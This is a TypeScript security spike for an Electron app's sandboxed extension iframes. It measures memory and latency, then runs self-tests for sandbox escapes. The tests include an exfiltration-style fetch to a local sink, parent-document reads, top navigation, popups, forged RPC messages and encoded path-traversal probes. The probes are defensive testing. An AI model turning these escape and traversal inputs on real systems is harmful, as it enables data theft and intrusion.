// T-015 spike orchestrator. It drives the spike debug page through executeJavaScript, reads process
// metrics from the injected host, runs the attack checks and writes one JSON report. It imports no
// Electron module: the host adapter in src/main/index.ts supplies everything OS-specific.

import { mkdir, rm, writeFile } from "node:fs/promises"
import { createServer, type Server } from "node:http"
import { cpus, tmpdir, totalmem } from "node:os"
import { dirname, join, relative, sep } from "node:path"
import { EXTENSION_CSP, EXTENSION_ID, EXTENSION_SCHEME, EXTENSION_SCHEME_PRIVILEGES } from "../shared/constants.js"
import {
  EXTENSION_CALLS,
  EXTENSION_RPC_PROTOCOL,
  EXTENSION_RPC_VERSION,
  type ExtensionCallName,
} from "../shared/envelope.js"

export interface SpikeProcessMetric {
  readonly pid: number
  readonly type: string
  /** Electron reports `memory.workingSetSize` in kilobytes. */
  readonly workingSetKb: number
}

export interface SpikeFrame {
  readonly url: string
  readonly processId: number
  readonly osProcessId: number
  readonly detached: boolean
  executeJavaScript(code: string): Promise<unknown>
}

export interface SpikeHost {
  readonly topExecute: (code: string) => Promise<unknown>
  readonly frames: () => readonly SpikeFrame[]
  readonly hostOSProcessId: () => number
  readonly hostChromiumProcessId: () => number
  readonly topURL: () => string
  readonly metrics: () => readonly SpikeProcessMetric[]
  readonly windowCount: () => number
  readonly fetchURL: (url: string) => Promise<{ status: number; text: () => Promise<string> }>
  readonly consoleMessages: () => readonly string[]
  readonly extensionRoot: string
  readonly outputPath: string
  readonly exit: (code: number) => void
}

const FRAME_LEVELS = [0, 1, 5, 10] as const
const LATENCY_CALLS = 1_000
const LATENCY_WARMUP = 50
const SETTLE_MS = 1_200
const SAMPLE_INTERVAL_MS = 500
const SAMPLE_COUNT = 3

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms))
}

function round(value: number, places = 4): number {
  const factor = 10 ** places
  return Math.round(value * factor) / factor
}

function asRecord(value: unknown, what: string): Record<string, unknown> {
  if (typeof value !== "object" || value === null) throw new Error(`${what} did not return an object`)
  return value as Record<string, unknown>
}

interface FrameProcess {
  readonly processId: number
  readonly osProcessId: number
  readonly url: string
}

interface MemorySnapshot {
  readonly at: string
  readonly frameCount: number
  readonly frameProcesses: readonly FrameProcess[]
  readonly uniqueExtensionOsPids: readonly number[]
  readonly missingFrameProcesses: readonly number[]
  readonly extensionWorkingSetKb: number
  readonly hostWorkingSetKb: number | null
  readonly tabWorkingSetKb: number
  readonly tabProcesses: readonly { readonly pid: number; readonly workingSetKb: number }[]
  readonly appWorkingSetKb: number
}

interface MemoryLevel extends MemorySnapshot {
  readonly requestedFrames: number
  readonly setFrames: Record<string, unknown>
  readonly samples: readonly {
    readonly at: string
    readonly extensionWorkingSetKb: number
    readonly tabWorkingSetKb: number
  }[]
  readonly marginalFromPrevious: {
    readonly framesAdded: number
    readonly extensionWorkingSetDeltaKb: number
    readonly kbPerFrame: number | null
  } | null
}

interface AttackResult {
  readonly id: string
  readonly title: string
  readonly method: string
  readonly outcome: "blocked" | "succeeded" | "inconclusive"
  readonly layer: string
  readonly evidence: Record<string, unknown>
}

interface Percentiles {
  readonly count: number
  readonly warmupCalls: number
  readonly minMs: number
  readonly meanMs: number
  readonly medianMs: number
  readonly p95Ms: number
  readonly p99Ms: number
  readonly maxMs: number
  readonly method: string
}

interface SpikeReport {
  readonly spike: string
  readonly startedAt: string
  completedAt?: string
  readonly environment: Record<string, unknown>
  readonly setup: Record<string, unknown>
  memory?: {
    readonly unit: string
    readonly levels: readonly MemoryLevel[]
  }
  isolation?: {
    readonly hostOSProcessId: number
    readonly hostChromiumProcessId: number
    readonly levels: readonly {
      readonly frames: number
      readonly frameProcesses: readonly FrameProcess[]
      readonly uniqueExtensionOsPids: readonly number[]
      readonly hostOwnProcess: boolean
      readonly separateFromHost: boolean | null
    }[]
  }
  latency?: Percentiles
  bridge?: Record<string, unknown>
  attacks?: readonly AttackResult[]
  attackFailure?: AttackResult
  error?: string
  readonly notes: string[]
}

function extensionFrames(host: SpikeHost): readonly SpikeFrame[] {
  const prefix = `${EXTENSION_SCHEME}://${EXTENSION_ID}/`
  return host.frames().filter((frame) => !frame.detached && frame.url.startsWith(prefix))
}

function snapshotMemory(host: SpikeHost): MemorySnapshot {
  const metrics = host.metrics()
  const frames = extensionFrames(host)
  const frameProcesses = frames.map((frame) => ({
    processId: frame.processId,
    osProcessId: frame.osProcessId,
    url: frame.url,
  }))
  const uniqueExtensionOsPids = [...new Set(frameProcesses.map((frame) => frame.osProcessId))]
  const byPid = new Map(metrics.map((metric) => [metric.pid, metric]))
  const missingFrameProcesses = uniqueExtensionOsPids.filter((pid) => !byPid.has(pid))
  const extensionWorkingSetKb = uniqueExtensionOsPids.reduce((sum, pid) => sum + (byPid.get(pid)?.workingSetKb ?? 0), 0)
  const tabProcesses = metrics
    .filter((metric) => metric.type === "Tab")
    .map((metric) => ({ pid: metric.pid, workingSetKb: metric.workingSetKb }))
  return {
    at: new Date().toISOString(),
    frameCount: frames.length,
    frameProcesses,
    uniqueExtensionOsPids,
    missingFrameProcesses,
    extensionWorkingSetKb,
    hostWorkingSetKb: byPid.get(host.hostOSProcessId())?.workingSetKb ?? null,
    tabWorkingSetKb: tabProcesses.reduce((sum, process) => sum + process.workingSetKb, 0),
    tabProcesses,
    appWorkingSetKb: metrics.reduce((sum, metric) => sum + metric.workingSetKb, 0),
  }
}

async function waitForPanel(host: SpikeHost): Promise<void> {
  for (let attempt = 0; attempt < 300; attempt += 1) {
    const ready = await host.topExecute("typeof window.__mortiseSpikePanel === 'object'")
    if (ready === true) return
    await sleep(100)
  }
  throw new Error("the spike panel did not mount within 30 s")
}

async function setFrameCount(host: SpikeHost, count: number): Promise<Record<string, unknown>> {
  const value = await host.topExecute(`window.__mortiseSpikePanel.setFrameCount(${count})`)
  return asRecord(value, "setFrameCount")
}

async function measureLevel(host: SpikeHost, count: number, previous: MemoryLevel | undefined): Promise<MemoryLevel> {
  const setFrames = await setFrameCount(host, count)
  await sleep(SETTLE_MS)
  const samples: MemorySnapshot[] = []
  for (let sample = 0; sample < SAMPLE_COUNT; sample += 1) {
    samples.push(snapshotMemory(host))
    if (sample < SAMPLE_COUNT - 1) await sleep(SAMPLE_INTERVAL_MS)
  }
  const last = samples[samples.length - 1]
  if (last === undefined) throw new Error("no memory sample was taken")
  const framesAdded = previous === undefined ? count : count - previous.frameCount
  const delta =
    previous === undefined ? last.extensionWorkingSetKb : last.extensionWorkingSetKb - previous.extensionWorkingSetKb
  return {
    ...last,
    requestedFrames: count,
    setFrames,
    samples: samples.map(({ at, extensionWorkingSetKb, tabWorkingSetKb }) => ({
      at,
      extensionWorkingSetKb,
      tabWorkingSetKb,
    })),
    marginalFromPrevious:
      framesAdded === 0
        ? null
        : {
            framesAdded,
            extensionWorkingSetDeltaKb: delta,
            kbPerFrame: round(delta / framesAdded, 1),
          },
  }
}

function percentile(sorted: readonly number[], fraction: number): number {
  if (sorted.length === 0) return 0
  const index = Math.min(sorted.length - 1, Math.max(0, Math.ceil(fraction * sorted.length) - 1))
  return sorted[index] ?? 0
}

function median(sorted: readonly number[]): number {
  if (sorted.length === 0) return 0
  const middle = Math.floor(sorted.length / 2)
  if (sorted.length % 2 === 1) return sorted[middle] ?? 0
  return ((sorted[middle - 1] ?? 0) + (sorted[middle] ?? 0)) / 2
}

async function measureLatency(host: SpikeHost): Promise<Percentiles> {
  const frame = extensionFrames(host)[0]
  if (frame === undefined) throw new Error("no extension frame to measure")
  const raw = await frame.executeJavaScript(`window.__mortiseSpike.measure(${LATENCY_CALLS})`)
  if (!Array.isArray(raw) || raw.length !== LATENCY_CALLS)
    throw new Error("latency measurement returned the wrong shape")
  const samples: number[] = []
  for (const value of raw) {
    if (typeof value !== "number" || !Number.isFinite(value)) throw new Error("latency sample was not a finite number")
    samples.push(value)
  }
  const sorted = [...samples].sort((left, right) => left - right)
  const sum = samples.reduce((total, value) => total + value, 0)
  return {
    count: samples.length,
    warmupCalls: LATENCY_WARMUP,
    minMs: round(sorted[0] ?? 0),
    meanMs: round(sum / samples.length),
    medianMs: round(median(sorted)),
    p95Ms: round(percentile(sorted, 0.95)),
    p99Ms: round(percentile(sorted, 0.99)),
    maxMs: round(sorted[sorted.length - 1] ?? 0),
    method:
      "sequential await of one notify round trip, timed with performance.now() inside the extension frame; " +
      `postMessage extension frame -> host renderer -> extension frame; ${LATENCY_WARMUP} warmup calls discarded`,
  }
}

function attack(
  id: string,
  title: string,
  method: string,
  outcome: AttackResult["outcome"],
  layer: string,
  evidence: Record<string, unknown>,
): AttackResult {
  return { id, title, method, outcome, layer, evidence }
}

async function checkRemoteFetch(host: SpikeHost, frame: SpikeFrame): Promise<AttackResult> {
  const hits: string[] = []
  let server: Server | undefined
  let port: number | undefined
  try {
    server = createServer((request, response) => {
      hits.push(request.url ?? "")
      response.writeHead(200, { "content-type": "text/plain" })
      response.end("host-side exfiltration sink")
    })
    await new Promise<void>((resolve, reject) => {
      server?.once("error", reject)
      server?.listen(0, "127.0.0.1", () => resolve())
    })
    const address = server.address()
    if (typeof address === "object" && address !== null) port = address.port
  } catch (error) {
    return attack("remote-fetch", "fetch to a remote URL", "local HTTP sink", "inconclusive", "none", {
      reason: error instanceof Error ? error.message : String(error),
    })
  }
  if (server === undefined || port === undefined) {
    await new Promise<void>((resolve) => server?.close(() => resolve()))
    return attack("remote-fetch", "fetch to a remote URL", "local HTTP sink", "inconclusive", "none", {
      reason: "the local server did not report a port",
    })
  }

  let result: Record<string, unknown>
  try {
    const raw = await frame.executeJavaScript(`(async () => {
      const violations = []
      const listener = (event) => violations.push({ directive: event.effectiveDirective, blockedURI: event.blockedURI })
      document.addEventListener("securitypolicyviolation", listener)
      let outcome
      try {
        const response = await fetch("http://127.0.0.1:${port}/exfil?secret=spike", { mode: "cors" })
        outcome = { ok: true, status: response.status }
      } catch (error) {
        outcome = { ok: false, name: error.name, message: error.message }
      }
      document.removeEventListener("securitypolicyviolation", listener)
      return { ...outcome, violations }
    })()`)
    result = asRecord(raw, "remote fetch check")
  } finally {
    await sleep(500)
    await new Promise<void>((resolve) => server?.close(() => resolve()))
  }

  const succeeded = result.ok === true || hits.length > 0
  const consoleEvidence = host
    .consoleMessages()
    .filter((line) => /Content Security Policy|Refused to connect|violates the following/i.test(line))
    .slice(-3)
  return attack(
    "remote-fetch",
    "fetch to a remote URL",
    "extension frame fetches http://127.0.0.1:<port>/exfil; a local HTTP sink counts requests",
    succeeded ? "succeeded" : "blocked",
    succeeded ? "none" : "CSP connect-src 'none'",
    { result, sinkHits: hits, consoleEvidence },
  )
}

async function checkParentDocument(frame: SpikeFrame): Promise<AttackResult> {
  const raw = await frame.executeJavaScript(`(() => {
    try {
      return { readable: true, length: parent.document.body.innerHTML.length }
    } catch (error) {
      return { readable: false, name: error.name, message: error.message }
    }
  })()`)
  const result = asRecord(raw, "parent.document check")
  return attack(
    "parent-document",
    "reading parent.document",
    "extension frame reads parent.document.body.innerHTML",
    result.readable === true ? "succeeded" : "blocked",
    result.readable === true ? "none" : "opaque origin (sandbox without allow-same-origin)",
    result,
  )
}

async function checkTopNavigation(host: SpikeHost, frame: SpikeFrame): Promise<AttackResult> {
  const beforeTop = host.topURL()
  const beforeFrame = frame.url
  const raw = await frame.executeJavaScript(`(() => {
    try {
      top.location.href = "https://example.com/mortise-spike"
      return { threw: false }
    } catch (error) {
      return { threw: true, name: error.name, message: error.message }
    }
  })()`)
  const result = asRecord(raw, "top.location check")
  await sleep(750)
  const afterTop = host.topURL()
  const afterFrame = extensionFrames(host)[0]?.url ?? null
  const unchanged = afterTop === beforeTop && afterFrame === beforeFrame
  const consoleEvidence = host
    .consoleMessages()
    .filter((line) => /allow-top-navigation|sandboxed|Unsafe attempt to initiate navigation/i.test(line))
    .slice(-3)
  return attack(
    "top-navigation",
    "top.location navigation",
    "extension frame assigns top.location.href to https://example.com/mortise-spike, then both URLs are re-read",
    result.threw === true && unchanged ? "blocked" : "succeeded",
    result.threw === true && unchanged ? "iframe sandbox (no allow-top-navigation)" : "none",
    { result, beforeTop, afterTop, beforeFrame, afterFrame, consoleEvidence },
  )
}

async function checkWindowOpen(host: SpikeHost, frame: SpikeFrame): Promise<AttackResult> {
  const beforeWindows = host.windowCount()
  const raw = await frame.executeJavaScript(`(() => {
    try {
      const opened = window.open("https://example.com/mortise-spike", "_blank")
      return { returned: opened === null ? "null" : "window-proxy" }
    } catch (error) {
      return { threw: true, name: error.name, message: error.message }
    }
  })()`)
  const result = asRecord(raw, "window.open check")
  await sleep(750)
  const afterWindows = host.windowCount()
  const blocked = (result.returned === "null" || result.threw === true) && afterWindows === beforeWindows
  const consoleEvidence = host
    .consoleMessages()
    .filter((line) => /allow-popups|Blocked opening/i.test(line))
    .slice(-3)
  return attack(
    "window-open",
    "window.open",
    "extension frame calls window.open(..., '_blank'); the host also counts BrowserWindows and denies all popups",
    blocked ? "blocked" : "succeeded",
    blocked ? "iframe sandbox (no allow-popups)" : "none",
    { result, beforeWindows, afterWindows, consoleEvidence },
  )
}

async function readBridgeStats(host: SpikeHost): Promise<Record<string, unknown>> {
  const value = await host.topExecute("window.__mortiseSpikePanel.bridgeStats()")
  return asRecord(value, "bridgeStats")
}

async function checkForgedMessage(host: SpikeHost, frame: SpikeFrame): Promise<AttackResult> {
  const before = await readBridgeStats(host)
  const beforeRejected = asRecord(before.rejected ?? {}, "before.rejected")
  const beforeWrongDirection = Number(beforeRejected["wrong-direction"] ?? 0)
  const beforeAccepted = Number(before.accepted ?? 0)

  const raw = await frame.executeJavaScript(`(() => {
    parent.postMessage({
      protocol: "mortise-extension-rpc",
      version: 1,
      direction: "host-to-extension",
      id: "forged-host-1",
      kind: "request",
      call: "notify",
      params: { kind: "info", message: "forged from extension" }
    }, "*")
    return { sent: true }
  })()`)
  await sleep(500)

  const after = await readBridgeStats(host)
  const afterRejected = asRecord(after.rejected ?? {}, "after.rejected")
  const afterWrongDirection = Number(afterRejected["wrong-direction"] ?? 0)
  const afterAccepted = Number(after.accepted ?? 0)
  const notificationsRaw = await host.topExecute("window.__mortiseSpikePanel.notifications()")
  const notifications = Array.isArray(notificationsRaw)
    ? notificationsRaw.filter((item) => typeof item === "string")
    : []
  const delivered = notifications.some((item) => item.includes("forged from extension"))
  const rejectedAsForgery = afterWrongDirection > beforeWrongDirection
  const blocked = !delivered && afterAccepted === beforeAccepted && rejectedAsForgery
  return attack(
    "forged-host-message",
    "forged message that claims to come from the host",
    "extension frame posts a host-to-extension request to the host; host accepts only extension-to-host from a registered frame source",
    blocked ? "blocked" : "succeeded",
    blocked ? "envelope direction check plus event.source identity" : "none",
    {
      sent: raw,
      beforeAccepted,
      afterAccepted,
      beforeWrongDirection,
      afterWrongDirection,
      delivered,
      notifications: notifications.slice(-10),
    },
  )
}

async function checkPathTraversal(host: SpikeHost): Promise<AttackResult> {
  const canary = join(tmpdir(), `mortise-spike-canary-${process.pid}.txt`)
  const marker = "MORTISE_CANARY_DO_NOT_SERVE"
  await writeFile(canary, marker)
  try {
    const relativeToRoot = relative(host.extensionRoot, canary)
    const segments = relativeToRoot.split(sep)
    const upCount = segments.filter((segment) => segment === "..").length
    const tail = segments
      .filter((segment) => segment !== "..")
      .map((segment) => encodeURIComponent(segment))
      .join("%2f")
    const traversal = `${"%2e%2e%2f".repeat(upCount)}${tail}`
    const absolute = canary
      .replace(/^\//, "")
      .split("/")
      .map((segment) => encodeURIComponent(segment))
      .join("%2f")
    const probes = [
      { id: "baseline-inside-root", url: `${EXTENSION_SCHEME}://${EXTENSION_ID}/package.json` },
      { id: "encoded-dot-dot", url: `${EXTENSION_SCHEME}://${EXTENSION_ID}/${traversal}` },
      { id: "encoded-absolute", url: `${EXTENSION_SCHEME}://${EXTENSION_ID}/%2f${absolute}` },
      { id: "double-encoded", url: `${EXTENSION_SCHEME}://${EXTENSION_ID}/%252e%252e%252f${tail}` },
      { id: "dot-segment-normalised", url: `${EXTENSION_SCHEME}://${EXTENSION_ID}/%2e%2e/package.json` },
      { id: "wrong-host", url: `${EXTENSION_SCHEME}://other.tasks/package.json` },
    ]
    const results: Record<string, unknown>[] = []
    for (const probe of probes) {
      try {
        const response = await host.fetchURL(probe.url)
        const body = await response.text()
        results.push({
          id: probe.id,
          url: probe.url,
          status: response.status,
          containsCanary: body.includes(marker),
          bodyPrefix: body.slice(0, 40),
        })
      } catch (error) {
        results.push({
          id: probe.id,
          url: probe.url,
          error: error instanceof Error ? error.message : String(error),
        })
      }
    }
    const leaked = results.some((result) => result.containsCanary === true)
    const baseline = results.find((result) => result.id === "baseline-inside-root")
    const usable = baseline?.status === 200
    return attack(
      "path-traversal",
      "path traversal against the scheme handler",
      "main-process net.fetch requests encoded ../ and absolute paths for a canary file outside the package root",
      leaked ? "succeeded" : usable ? "blocked" : "inconclusive",
      leaked ? "none" : "decode once, resolve inside root, realpath must stay inside root",
      { canary, results },
    )
  } finally {
    await rm(canary, { force: true })
  }
}

async function checkNetworkFetchCall(host: SpikeHost, frame: SpikeFrame): Promise<Record<string, unknown>> {
  const raw = await frame.executeJavaScript(`(async () => {
    try {
      await window.__mortiseSpike.networkFetch()
      return { denied: false }
    } catch (error) {
      return { denied: true, code: error.code, message: error.message }
    }
  })()`)
  const result = asRecord(raw, "network.fetch call")
  const stats = await readBridgeStats(host)
  const calls = asRecord(stats.calls ?? {}, "bridge calls")
  return { result, bridgeCalls: calls["network.fetch"] ?? 0 }
}

function environment(): Record<string, unknown> {
  const processors = cpus()
  return {
    electron: process.versions.electron ?? "unknown",
    chromium: process.versions.chrome ?? "unknown",
    node: process.versions.node,
    v8: process.versions.v8,
    platform: process.platform,
    arch: process.arch,
    cpuModel: processors[0]?.model ?? "unknown",
    cpuCount: processors.length,
    totalMemoryMiB: Math.round(totalmem() / 1_048_576),
  }
}

async function writeReport(report: SpikeReport, host: SpikeHost): Promise<void> {
  await mkdir(dirname(host.outputPath), { recursive: true })
  await writeFile(host.outputPath, `${JSON.stringify(report, null, 2)}\n`, "utf8")
  console.log(`[extension-sandbox-spike] report: ${host.outputPath}`)
}

async function run(host: SpikeHost, report: SpikeReport): Promise<void> {
  await waitForPanel(host)

  const levels: MemoryLevel[] = []
  for (const level of FRAME_LEVELS) {
    const measured = await measureLevel(host, level, levels[levels.length - 1])
    levels.push(measured)
    report.notes.push(
      `level ${level}: ${measured.frameCount} frames, ${measured.uniqueExtensionOsPids.length} renderer process(es), ` +
        `${measured.extensionWorkingSetKb} KiB extension working set`,
    )
  }
  report.memory = { unit: "KiB (Electron memory.workingSetSize)", levels }

  report.isolation = {
    hostOSProcessId: host.hostOSProcessId(),
    hostChromiumProcessId: host.hostChromiumProcessId(),
    levels: levels.map((level) => ({
      frames: level.frameCount,
      frameProcesses: level.frameProcesses,
      uniqueExtensionOsPids: level.uniqueExtensionOsPids,
      hostOwnProcess: level.uniqueExtensionOsPids.includes(host.hostOSProcessId()),
      separateFromHost:
        level.uniqueExtensionOsPids.length === 0 ? null : !level.uniqueExtensionOsPids.includes(host.hostOSProcessId()),
    })),
  }

  // Return to one frame for latency and attack checks.
  await setFrameCount(host, 1)
  await sleep(800)
  report.latency = await measureLatency(host)
  const frame = extensionFrames(host)[0]
  if (frame === undefined) throw new Error("the extension frame disappeared before the attack checks")
  report.bridge = {
    protocol: EXTENSION_RPC_PROTOCOL,
    version: EXTENSION_RPC_VERSION,
    calls: EXTENSION_CALLS satisfies readonly ExtensionCallName[],
    networkFetch: await checkNetworkFetchCall(host, frame),
  }

  const attacks: AttackResult[] = []
  attacks.push(await checkRemoteFetch(host, frame))
  attacks.push(await checkParentDocument(frame))
  attacks.push(await checkTopNavigation(host, frame))
  attacks.push(await checkWindowOpen(host, frame))
  attacks.push(await checkForgedMessage(host, frame))
  attacks.push(await checkPathTraversal(host))
  report.attacks = attacks

  const failed = attacks.find((attackResult) => attackResult.outcome === "succeeded")
  if (failed !== undefined) {
    // Stop at the first successful attack. Nothing after it runs; the report says exactly what got
    // through and how, and exits non-zero so an unattended run cannot pass unnoticed.
    report.attackFailure = failed
    report.completedAt = new Date().toISOString()
    await writeReport(report, host)
    host.exit(2)
    return
  }

  report.completedAt = new Date().toISOString()
  await writeReport(report, host)
  host.exit(0)
}

/**
 * Runs the whole spike and exits the app. Every measurement is written to `host.outputPath` first;
 * `exit(2)` means an attack check succeeded and the run stopped there, `exit(1)` means it could not
 * finish, `exit(0)` means all checks were blocked.
 */
export async function runExtensionSandboxSpike(host: SpikeHost): Promise<void> {
  const report: SpikeReport = {
    spike: "T-015 sandboxed extension iframe",
    startedAt: new Date().toISOString(),
    environment: environment(),
    setup: {
      scheme: EXTENSION_SCHEME,
      extensionId: EXTENSION_ID,
      schemePrivileges: EXTENSION_SCHEME_PRIVILEGES,
      csp: EXTENSION_CSP,
      iframe: 'sandbox="allow-scripts" (no allow-same-origin)',
      hostPage: "dev-only spike window built with MORTISE_SPIKE_BUILD=1",
      bridge: {
        protocol: EXTENSION_RPC_PROTOCOL,
        version: EXTENSION_RPC_VERSION,
        calls: EXTENSION_CALLS,
        validation: "event.source identity plus direction, version, kind, call and params",
      },
    },
    notes: [],
  }
  try {
    await run(host, report)
  } catch (error) {
    report.error = error instanceof Error ? `${error.name}: ${error.message}` : String(error)
    report.completedAt = new Date().toISOString()
    try {
      await writeReport(report, host)
    } finally {
      host.exit(1)
    }
  }
}
